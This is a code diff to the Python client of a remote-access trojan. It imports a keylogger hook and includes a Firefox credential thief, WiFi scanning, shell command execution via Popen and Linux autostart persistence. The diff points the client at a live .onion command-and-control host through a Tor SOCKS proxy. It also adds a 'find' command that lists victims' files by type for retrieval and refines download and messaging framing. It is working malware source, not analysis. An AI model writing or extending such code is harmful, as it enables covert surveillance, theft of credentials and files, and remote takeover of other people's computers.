@@ -9,9 +9,16 @@ import pyxhook
 def DownHTTP(url,fileName):
     fileHTTP = urllib.URLopener()
     if fileName == "":
-        fileHTTP.retrieve(url,url.split("/")[len(url.split("/"))-1])
+        if os.path.isfile(url.split("/")[len(url.split("/"))-1]) == 1:
+            newName = url.split("/")[len(url.split("/"))-1].split(".")[0]+"_."+url.split("/")[len(url.split("/"))-1].split(".")[1]
+            fileHTTP.retrieve(url,newName)
+            return " saved the file with the original name + \"_\""
+        else:
+            fileHTTP.retrieve(url,url.split("/")[len(url.split("/"))-1])
+            return " saved the file with the original name"
     else:
         fileHTTP.retrieve(url,fileName)
+        return " saved the file with the given name"
 
 def kbevent(event):
     Wevent = str(event) + "\n"
@@ -90,8 +97,8 @@ class PKCS7Encoder():
         return text[:-pad]
 
 encoder = PKCS7Encoder()
-#host = 'hcjczulezpxxfw2n.onion'
-host = '127.0.0.1'
+host = 'ws5kiveqr7awx6bk.onion'
+#host = '127.0.0.1'
 cType = "client000-crypto" #client Type
 
 ######### virtus-total check
@@ -156,7 +163,20 @@ except:
 
 def RecvData():
     temp = ssl_sock.read()
-    return temp
+    outData = ""
+    while temp != "SEND":
+        outData += temp
+        temp = ssl_sock.read()
+    return outData
+
+def FindFile(path, fileType):
+    FileList = open("list_"+fileType+".txt", "wa")
+    for root, dirs, files in os.walk(path):
+        for file in files:
+             if file.endswith("."+fileType):
+                 FileList.write(os.path.join(root, file)+"\n")
+    FileList.close()
+    return "--> list_"+fileType+".txt"
 
 # autostart for Linux
 def LinuxAutoStart():
@@ -187,10 +207,6 @@ def ScanWIFI(card):
     for i in range(0,len(wifiCell)):
         SendData(str(wifiCell[i]) + " is encrypted: "+ str(wifiCell[i].encrypted) + "= " + str(wifiCell[i].encryption_type) + " | address: " +str(wifiCell[i].address))
     SendData("ScanWIFI-finished")
-
-def RecvData():
-    temp = ssl_sock.read()
-    return temp
 
 def FirefoxThief():
     if platform.system() == "Linux":
@@ -283,6 +299,7 @@ def CheckHash(fileName, key, IV):
 
 def SendData(inText):
     ssl_sock.write(inText)
+    ssl_sock.write("CEND")
 
 def EXEC(cmd):
     p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
@@ -345,7 +362,7 @@ else:
         print("Cert generated")
 
 sock = socks.socksocket()
-#sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
+sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
 sock.connect((host,5555))
 
 ssl_sock = ssl.wrap_socket(sock, ca_certs="certificate.pem", cert_reqs=ssl.CERT_REQUIRED)
@@ -418,14 +435,20 @@ while 1:
         card = inText.split(":")[1]
         mapped = MapsWIFI(card)
         SendData(mapped)
+    elif inText.startswith("find"):
+        if len(inText.split("|")) == 3:
+            listFile = FindFile(inText.split("|")[1],inText.split("|")[2])
+            SendData(listFile)
+        else:
+            SendData("usage: find|path|type")
     elif inText.startswith("downhttp"):
         try:
             if len(inText.split("|")) == 3:
-                DownHTTP(inText.split("|")[1],inText.split("|")[2])
-                SendData("Download complete!")
+                retDown = DownHTTP(inText.split("|")[1],inText.split("|")[2])
+                SendData("|--- Download complete! --- "+retDown)
             elif len(inText.split("|")) == 2:
-                DownHTTP(inText.split("|")[1],"")
-                SendData("Download complete!")
+                retDown = DownHTTP(inText.split("|")[1],"")
+                SendData("|--- Download complete! --- "+retDown)
             else:
                 SendData("Error! \n usage: downhttp|url|save.type")
         except IOError as err:
